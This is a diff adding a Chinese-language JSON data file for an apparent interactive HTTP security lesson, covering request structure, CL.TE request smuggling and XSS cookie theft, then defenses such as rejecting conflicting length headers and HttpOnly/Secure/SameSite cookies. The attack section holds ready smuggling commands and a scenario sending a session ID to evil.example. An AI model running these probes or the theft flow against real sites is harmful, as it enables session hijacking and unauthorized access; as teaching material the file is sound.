@@ -1,0 +1,605 @@
+{
+ "id": "http",
+ "notes": {
+  "Method": {
+   "short": "方法即能力，PUT 最险",
+   "more": "3 字节大写 ASCII，定义对资源的动作：GET/HEAD 读、POST 提交、PUT 覆盖、DELETE 删除、OPTIONS 探测、TRACE 回显。方法本身不带权限语义。",
+   "sec": "服务端误开 PUT，等于把写权限交给全网；TRACE 未关可被用于跨站追踪。"
+  },
+  "Request-Target": {
+   "short": "路径加查询串，GET 必外泄",
+   "more": "origin-form 的目标，包含路径与查询串。查询串会进浏览器历史、代理日志与 Referer 头，任何中间环节都能读到。",
+   "sec": "凭据绝不能放查询串，它天然被记录、被转发给第三方。"
+  },
+  "Host-Value": {
+   "short": "虚拟主机路由的枢纽",
+   "more": "HTTP/1.1 唯一必选首部的值，一台服务器用同一个 IP 承载多个站点，全靠这个名字决定命中哪个 vhost。",
+   "sec": "改成 internal.admin.example 常能直接摸到只绑内网域名的后台。"
+  },
+  "Cookie-Value": {
+   "short": "会话凭据，拿到即等于本人",
+   "more": "键值对形式，SID 是服务端会话的索引，服务端不认人只认这串字符。整个会话体系里价值最高的一小段字节。",
+   "sec": "嗅探可截、XSS 可读、CSRF 可借，三者都不需要破解任何加密。"
+  },
+  "Set-Cookie:": {
+   "short": "服务端下发凭据的唯一途径",
+   "more": "响应首部，携带键值对与属性：Path 限定发送路径，HttpOnly 禁止脚本读取，Secure 限定只在 TLS 下发送，SameSite 控制跨站携带。",
+   "sec": "缺 HttpOnly 是 XSS 偷凭据的前提，缺 SameSite 是 CSRF 的前提。"
+  },
+  "Cookie-Attrs": {
+   "short": "属性决定凭据能被谁拿走",
+   "more": "Cookie 值与属性的合体。属性是边界不是建议：HttpOnly 让 document.cookie 读不到，Secure 让明文请求不带它，SameSite 拦跨站自动携带。",
+   "sec": "三个属性各封一条窃取路径，缺一条就漏一条。"
+  },
+  "Content-Length:": {
+   "short": "长度声明，偷渡的入口",
+   "more": "声明主体字节数的两种方式之一，另一种是 Transfer-Encoding: chunked。两者同时出现且矛盾时，前后端可能各信一个。",
+   "sec": "CL.TE 与 TE.CL 的成立条件，就是这条首部与 TE 的解释不一致。"
+  },
+  "CL-Value": {
+   "short": "长度值，与实际字节比对",
+   "more": "主体字节数。它必须与真实正文逐字节吻合；偏大就会把后续报文的字节吞进本次主体，偏小则把剩余字节留给下一个请求。",
+   "sec": "长度与实际不符是响应拆分与走私的共同产物。"
+  },
+  "R+StreamID": {
+   "short": "流标识，HTTP/2 的并发单位",
+   "more": "31 位流标识加 1 位保留位。帧属于流、流属于连接，多条流可在一条 TCP 上并发并乱序重组；SETTINGS 作用于整条连接故为 0。",
+   "sec": "跳号或复用已关闭的流是协议错误，也是某些实现崩溃的触发点。"
+  },
+  "Flags": {
+   "short": "帧标志，语义随类型变",
+   "more": "8 位标志，含义由帧类型决定：DATA 的 0x01 是 END_STREAM、0x08 是 PADDED；SETTINGS 的 0x01 是 ACK。同一字节解释不同。",
+   "sec": "对标志位理解不一致，就是新一代走私的夹带区。"
+  }
+ },
+ "acts": [
+  {
+   "key": "normal",
+   "no": "第 1 幕",
+   "title": "它正常怎么工作",
+   "desc": "请求行 + 首部 + 空行，服务器用一个 Cookie 记住你",
+   "lead": "先看一次登录。注意报文边界只靠 CRLF 与长度字段约定，没有长度前缀。",
+   "scenes": [
+    {
+     "name": "一次登录与取页",
+     "cmds": {
+      "linux": [
+       {
+        "c": "curl -v --http1.1 'https://bank.example/login?user=alice' -o /dev/null",
+        "n": "-v 打出请求行与全部首部，看 CRLF 与空行怎么切出报文",
+        "s": "《系统》Linux.md · curl"
+       },
+       {
+        "c": "curl -sI https://bank.example/",
+        "n": "只看响应首部：状态码、Location、Set-Cookie 属性一目了然",
+        "s": "《系统》Linux.md · curl"
+       },
+       {
+        "c": "sudo tcpdump -A -s0 'tcp port 80'",
+        "n": "明文抓一次，首部逐行可读，正文紧随空行",
+        "s": "补充（vault 无 tcpdump，抓包必备）"
+       }
+      ],
+      "ps": [
+       {
+        "c": "$r = Invoke-WebRequest https://bank.example/ -MaximumRedirection 0 -SkipHttpErrorCheck; $r.Headers",
+        "n": "打印全部响应首部，-MaximumRedirection 0 才能看到 3xx 本身",
+        "s": "补充（vault 未收录 Invoke-WebRequest，抓首部最直接）"
+       },
+       {
+        "c": "(Invoke-WebRequest https://bank.example/ -SessionVariable s).StatusCode; $s.Cookies.GetCookies('https://bank.example')",
+        "n": "拿状态码和会话 Cookie 及其属性",
+        "s": "补充（vault 未收录 Invoke-WebRequest）"
+       }
+      ],
+      "cmd": [
+       {
+        "c": "curl.exe -v --http1.1 https://bank.example/",
+        "n": "Win10 起自带 curl，输出与 Linux 完全一致",
+        "s": "补充（Windows 自带 curl.exe，vault 未收录）"
+       },
+       {
+        "c": "netstat -ano | findstr :443",
+        "n": "看这条连接与占用它的 PID",
+        "s": "《系统》Windows CMD.md · netstat"
+       }
+      ]
+     },
+     "steps": [
+      {
+       "who": "浏览器",
+       "to": "服务器",
+       "pkt": 0,
+       "bubble": "GET",
+       "hl": [
+        "Method",
+        "Request-Target",
+        "HTTP-Version"
+       ],
+       "vals": {
+        "Method": "GET",
+        "Request-Target": "/login?user=alice",
+        "HTTP-Version": "HTTP/1.1"
+       },
+       "say": "请求行三件套：方法、目标、版本，空格分隔、CRLF 收尾。",
+       "sub": "查询串会进日志、历史与 Referer。"
+      },
+      {
+       "who": "浏览器",
+       "to": "服务器",
+       "pkt": 0,
+       "bubble": "Host + Cookie",
+       "hl": [
+        "Host:",
+        "Host-Value",
+        "Cookie:",
+        "Cookie-Value"
+       ],
+       "vals": {
+        "Host-Value": "bank.example",
+        "Cookie-Value": "SID=8f3a1c02d4e5"
+       },
+       "say": "Host 决定命中哪台虚拟主机，Cookie 让服务器认出这是谁。",
+       "sub": "协议本身无状态，身份全靠这串字符。"
+      },
+      {
+       "who": "服务器",
+       "to": "浏览器",
+       "pkt": 1,
+       "bubble": "302 + Set-Cookie",
+       "hl": [
+        "Status-Code",
+        "Location:",
+        "Set-Cookie:",
+        "Cookie-Attrs"
+       ],
+       "vals": {
+        "Status-Code": "302",
+        "Location-Value": "https://bank.example/home",
+        "Cookie-Attrs": "SID=8f3a…; Path=/; HttpOnly"
+       },
+       "say": "登录成功：302 跳首页，同时下发带 HttpOnly 的会话 Cookie。",
+       "sub": "Location 与 Set-Cookie 是最常出事的两个首部。"
+      },
+      {
+       "who": "服务器",
+       "to": "浏览器",
+       "pkt": 1,
+       "bubble": "空行定边界",
+       "hl": [
+        "Content-Length:",
+        "CL-Value",
+        "CRLF"
+       ],
+       "vals": {
+        "CL-Value": "0",
+        "CRLF": "单独 CRLF = 首部结束"
+       },
+       "say": "首部后一个空行宣告结束，Content-Length 说明正文有多长。",
+       "sub": "报文边界只靠字节模式，不靠长度前缀。"
+      },
+      {
+       "who": "服务器",
+       "to": "浏览器",
+       "pkt": 2,
+       "bubble": "HTTP/2 SETTINGS",
+       "hl": [
+        "Length",
+        "Type",
+        "Flags",
+        "R+StreamID"
+       ],
+       "vals": {
+        "Length": "18",
+        "Type": "0x04 SETTINGS",
+        "R+StreamID": "0（作用于整条连接）"
+       },
+       "say": "换成 HTTP/2 后最小单位是帧，9 字节帧头里带类型与流 ID。",
+       "sub": "一条连接并发多条流，响应可乱序重组。"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "key": "attack",
+   "no": "第 2 幕",
+   "title": "它会被怎么打",
+   "desc": "让两端对报文边界理解不一致；再把会话凭据从浏览器里取走",
+   "lead": "两个场景：一个骗的是中间件，一个骗的是浏览器。共同点是都没有碰密码。",
+   "scenes": [
+    {
+     "name": "请求偷渡 CL.TE",
+     "cmds": {
+      "linux": [
+       {
+        "c": "printf 'POST /search HTTP/1.1\\r\\nHost: bank.example\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG' | openssl s_client -connect bank.example:443 -quiet",
+        "n": "手工发一份双长度报文，看前端与后端谁先报错",
+        "s": "补充（vault 无 openssl s_client，走私验证的原始手段）"
+       },
+       {
+        "c": "curl -v --http1.1 -X POST https://bank.example/search -H 'Transfer-Encoding: chunked' -H 'Content-Length: 6' --data-binary $'0\\r\\n\\r\\nG'",
+        "n": "用 curl 复现同一组互相矛盾的首部",
+        "s": "《系统》Linux.md · curl"
+       },
+       {
+        "c": "sudo tcpdump -A -s0 'tcp port 80' | grep -A2 'Transfer-Encoding'",
+        "n": "抓一次看两个长度头是否同时出现",
+        "s": "补充（vault 无 tcpdump，抓包必备）"
+       }
+      ],
+      "ps": [
+       {
+        "c": "Invoke-WebRequest https://bank.example/search -Method POST -Headers @{'Transfer-Encoding'='chunked';'Content-Length'='6'} -Body \"0`r`n`r`nG\" -SkipHttpErrorCheck",
+        "n": "复现矛盾首部，多数栈会直接拒",
+        "s": "补充（vault 未收录 Invoke-WebRequest）"
+       },
+       {
+        "c": "Get-NetTCPConnection -RemotePort 80 | Select-Object LocalPort,State",
+        "n": "偷渡成功后连接常卡在 Established 不释放",
+        "s": "《系统》PowerShell.md · Get-NetTCPConnection"
+       }
+      ],
+      "cmd": [
+       {
+        "c": "netstat -ano | findstr :80",
+        "n": "找异常长存的连接与所属进程",
+        "s": "《系统》Windows CMD.md · netstat"
+       },
+       {
+        "c": "curl.exe -v -X POST https://bank.example/search -H \"Transfer-Encoding: chunked\" -H \"Content-Length: 6\" --data-binary \"0\"",
+        "n": "同一条复现，在 Windows 侧执行",
+        "s": "补充（Windows 自带 curl.exe，vault 未收录）"
+       }
+      ]
+     },
+     "steps": [
+      {
+       "who": "攻击者",
+       "to": "前端代理",
+       "pkt": 0,
+       "evil": true,
+       "bubble": "双长度 POST",
+       "hl": [
+        "Method",
+        "Request-Target",
+        "HTTP-Version"
+       ],
+       "vals": {
+        "Method": "POST",
+        "Request-Target": "/search",
+        "HTTP-Version": "HTTP/1.1"
+       },
+       "say": "同一报文既给 Content-Length: 6，又给 Transfer-Encoding: chunked。",
+       "sub": "两个长度声明互相矛盾，两端各信一个。"
+      },
+      {
+       "who": "前端代理",
+       "to": "后端服务器",
+       "pkt": 0,
+       "bubble": "按 CL 转发",
+       "hl": [
+        "HTTP-Version",
+        "CRLF"
+       ],
+       "vals": {
+        "HTTP-Version": "HTTP/1.1",
+        "CRLF": "前端认为边界在此，整段照发"
+       },
+       "say": "前端信 Content-Length，把 6 字节之后的全部字节原样转给后端。",
+       "sub": "它以为请求已结束，后端以为块体还没读完。"
+      },
+      {
+       "who": "攻击者",
+       "to": "前端代理",
+       "pkt": 0,
+       "evil": true,
+       "bubble": "夹带请求",
+       "hl": [
+        "Method",
+        "Request-Target",
+        "Host-Value"
+       ],
+       "vals": {
+        "Method": "GET（藏在块体里）",
+        "Request-Target": "/admin",
+        "Host-Value": "bank.example"
+       },
+       "say": "块体尾部夹一条完整的 GET /admin，字节停在后端缓冲区里。",
+       "sub": "它成了后端连接上的下一个请求。"
+      },
+      {
+       "who": "受害者",
+       "to": "前端代理",
+       "pkt": 0,
+       "bubble": "正常请求",
+       "hl": [
+        "Method",
+        "Request-Target",
+        "Cookie:"
+       ],
+       "vals": {
+        "Method": "GET",
+        "Request-Target": "/profile",
+        "Cookie:": "SID=…"
+       },
+       "say": "受害者照常请求自己的页面，请求被排到夹带残留之后。",
+       "sub": "排队位置决定了他拿到谁的响应。"
+      },
+      {
+       "who": "后端服务器",
+       "to": "受害者",
+       "pkt": 1,
+       "bubble": "越权响应",
+       "hl": [
+        "Status-Code",
+        "Content-Length:",
+        "CL-Value"
+       ],
+       "vals": {
+        "Status-Code": "200",
+        "CL-Value": "= 管理页正文长度"
+       },
+       "say": "后端按夹带出的 /admin 处理，把管理页内容回给了受害者。",
+       "sub": "若命中共享缓存，污染扩散到全体用户。"
+      }
+     ]
+    },
+    {
+     "name": "Cookie 窃取与会话劫持",
+     "cmds": {
+      "linux": [
+       {
+        "c": "curl -v -c /tmp/jar.txt https://bank.example/login -d 'user=alice&pass=x'",
+        "n": "-c 存 Cookie，-v 里能看到 Set-Cookie 有没有 HttpOnly",
+        "s": "《系统》Linux.md · curl"
+       },
+       {
+        "c": "curl -si https://bank.example/login -d 'user=alice' | grep -i set-cookie",
+        "n": "只挑 Set-Cookie 行，逐个属性检查",
+        "s": "《系统》Linux.md · curl"
+       },
+       {
+        "c": "sudo tcpdump -A -s0 'tcp port 80' | grep -i 'cookie:'",
+        "n": "明文链路上直接读出 SID",
+        "s": "补充（vault 无 tcpdump，抓包必备）"
+       }
+      ],
+      "ps": [
+       {
+        "c": "(Invoke-WebRequest https://bank.example/login -Method POST -Body @{user='alice'} -SessionVariable s).Headers['Set-Cookie']",
+        "n": "直接看下发的属性，缺 HttpOnly 一眼可见",
+        "s": "补充（vault 未收录 Invoke-WebRequest）"
+       },
+       {
+        "c": "Get-NetTCPConnection -RemotePort 80 | Select-Object RemoteAddress,State",
+        "n": "确认这条会话还活着，重放才有意义",
+        "s": "《系统》PowerShell.md · Get-NetTCPConnection"
+       }
+      ],
+      "cmd": [
+       {
+        "c": "curl.exe -si https://bank.example/login | findstr /i set-cookie",
+        "n": "单看 Set-Cookie 属性",
+        "s": "补充（Windows 自带 curl.exe，vault 未收录）"
+       },
+       {
+        "c": "netstat -ano | findstr :80",
+        "n": "会话连接与所属进程",
+        "s": "《系统》Windows CMD.md · netstat"
+       }
+      ]
+     },
+     "steps": [
+      {
+       "who": "服务器",
+       "to": "受害者",
+       "pkt": 1,
+       "bubble": "无 HttpOnly",
+       "hl": [
+        "Set-Cookie:",
+        "Cookie-Attrs"
+       ],
+       "vals": {
+        "Cookie-Attrs": "SID=8f3a…; Path=/（无 HttpOnly、无 Secure）"
+       },
+       "say": "会话 ID 就这几个字节，服务器此后只认它不认人。",
+       "sub": "缺 HttpOnly 脚本能读，缺 Secure 明文能嗅。"
+      },
+      {
+       "who": "攻击者",
+       "to": "受害者浏览器",
+       "pkt": 0,
+       "evil": true,
+       "bubble": "注入脚本",
+       "hl": [
+        "Method",
+        "Request-Target"
+       ],
+       "vals": {
+        "Method": "POST",
+        "Request-Target": "/comment"
+       },
+       "say": "在评论区提交 <script>，把 document.cookie 拼进图片地址。",
+       "sub": "缺 CSP，内联脚本直接执行。"
+      },
+      {
+       "who": "受害者浏览器",
+       "to": "攻击者",
+       "pkt": 0,
+       "bubble": "凭据外带",
+       "hl": [
+        "Method",
+        "Request-Target",
+        "Host-Value"
+       ],
+       "vals": {
+        "Request-Target": "/?c=SID=8f3a1c02d4e5",
+        "Host-Value": "evil.example"
+       },
+       "say": "受害者自己的浏览器把会话 ID 送了出去。",
+       "sub": "一次图片请求，凭据就过了边界。"
+      },
+      {
+       "who": "攻击者",
+       "to": "服务器",
+       "pkt": 0,
+       "evil": true,
+       "bubble": "重放",
+       "hl": [
+        "Cookie:",
+        "Cookie-Value",
+        "Host-Value"
+       ],
+       "vals": {
+        "Cookie-Value": "SID=8f3a1c02d4e5",
+        "Host-Value": "bank.example"
+       },
+       "say": "拿同一串 SID 重放请求，服务器分不清本人与持票人。",
+       "sub": "会话被接管，受害者毫无感知。"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "key": "defend",
+   "no": "第 3 幕",
+   "title": "防护在哪一步掐断它",
+   "desc": "先让报文边界只有一个解，再让凭据拿不走",
+   "lead": "偷渡靠的是两端理解不一致，去掉这层差异就没了立足点；凭据靠属性封死三条路。",
+   "scenes": [
+    {
+     "name": "统一解析 + 安全 Cookie",
+     "cmds": {
+      "linux": [
+       {
+        "c": "curl -sv --http1.1 https://bank.example/ 2>&1 | grep -E 'Cookie|HttpOnly|Strict-Transport'",
+        "n": "一次看 Cookie 属性与 HSTS 头有没有下发",
+        "s": "《系统》Linux.md · curl"
+       },
+       {
+        "c": "curl -s -o /dev/null -w '%{http_code}\\n' -X POST https://bank.example/ -H 'Transfer-Encoding: chunked' -H 'Content-Length: 6'",
+        "n": "期望 400 而不是 200，说明互斥规则真的生效",
+        "s": "《系统》Linux.md · curl"
+       },
+       {
+        "c": "sudo tcpdump -A -s0 'tcp port 80' | grep -iE 'x-forwarded|content-length'",
+        "n": "观察客户端自带的伪造首部有没有穿过代理",
+        "s": "补充（vault 无 tcpdump，抓包必备）"
+       }
+      ],
+      "ps": [
+       {
+        "c": "Invoke-WebRequest https://bank.example/ -Headers @{'Transfer-Encoding'='chunked';'Content-Length'='6'} -SkipHttpErrorCheck",
+        "n": "期望被 400 挡住；-SkipHttpErrorCheck 才能读到 4xx",
+        "s": "补充（vault 未收录 Invoke-WebRequest）"
+       },
+       {
+        "c": "(Invoke-WebRequest https://bank.example/).Headers['Strict-Transport-Security']",
+        "n": "HSTS 是否下发，决定之后的明文请求会不会被浏览器改写",
+        "s": "补充（vault 未收录 Invoke-WebRequest）"
+       }
+      ],
+      "cmd": [
+       {
+        "c": "curl.exe -s -o NUL -w \"%{http_code}\" -X POST https://bank.example/ -H \"Transfer-Encoding: chunked\"",
+        "n": "返回 400 说明互斥规则生效",
+        "s": "补充（Windows 自带 curl.exe，vault 未收录）"
+       },
+       {
+        "c": "netstat -ano | findstr :443",
+        "n": "确认连接仍走 TLS",
+        "s": "《系统》Windows CMD.md · netstat"
+       }
+      ]
+     },
+     "steps": [
+      {
+       "who": "前端代理",
+       "to": "攻击者",
+       "pkt": 1,
+       "bubble": "400 拒绝",
+       "hl": [
+        "Status-Code",
+        "Reason-Phrase",
+        "Content-Length:"
+       ],
+       "vals": {
+        "Status-Code": "400",
+        "Reason-Phrase": "Bad Request",
+        "Content-Length:": "0"
+       },
+       "say": "按 RFC 9112：CL 与 TE 同时出现即拒收，报文只允许一个解释。",
+       "sub": "夹带字节连进入缓冲区都没机会。"
+      },
+      {
+       "who": "攻击者",
+       "to": "前端代理",
+       "pkt": 0,
+       "evil": true,
+       "bubble": "重放偷渡",
+       "hl": [
+        "Method",
+        "Request-Target",
+        "CRLF"
+       ],
+       "vals": {
+        "Method": "POST",
+        "Request-Target": "/search",
+        "CRLF": "边界唯一，夹带无处落脚"
+       },
+       "say": "同一份字节重放，前后端算出的是同一个报文边界。",
+       "sub": "差异一消失，偷渡就没有立足点。"
+      },
+      {
+       "who": "前端代理",
+       "to": "后端服务器",
+       "pkt": 1,
+       "bubble": "长度自洽",
+       "hl": [
+        "Content-Length:",
+        "CL-Value"
+       ],
+       "vals": {
+        "CL-Value": "与实际正文逐字节一致"
+       },
+       "say": "代理重写长度并规范首部，后端只看到一种编码。",
+       "sub": "链路统一解析实现，互斥规则才落得下去。"
+      },
+      {
+       "who": "服务器",
+       "to": "受害者",
+       "pkt": 1,
+       "bubble": "安全 Cookie",
+       "hl": [
+        "Set-Cookie:",
+        "Cookie-Attrs"
+       ],
+       "vals": {
+        "Cookie-Attrs": "SID=…; HttpOnly; Secure; SameSite=Lax"
+       },
+       "say": "三个属性各封一条路：脚本读不到、明文发不出、跨站不自动带。",
+       "sub": "登录后再换发新 SID，旧 ID 立即失效。"
+      },
+      {
+       "who": "受害者浏览器",
+       "to": "攻击者",
+       "pkt": 0,
+       "bubble": "读不到",
+       "hl": [
+        "Cookie:",
+        "Cookie-Value"
+       ],
+       "vals": {
+        "Cookie-Value": "（空：document.cookie 返回空串）"
+       },
+       "say": "同一个 XSS 再跑一遍，外带请求里没有任何凭据。",
+       "sub": "HttpOnly 让脚本连看都看不到。"
+      }
+     ]
+    }
+   ]
+  }
+ ]
+}
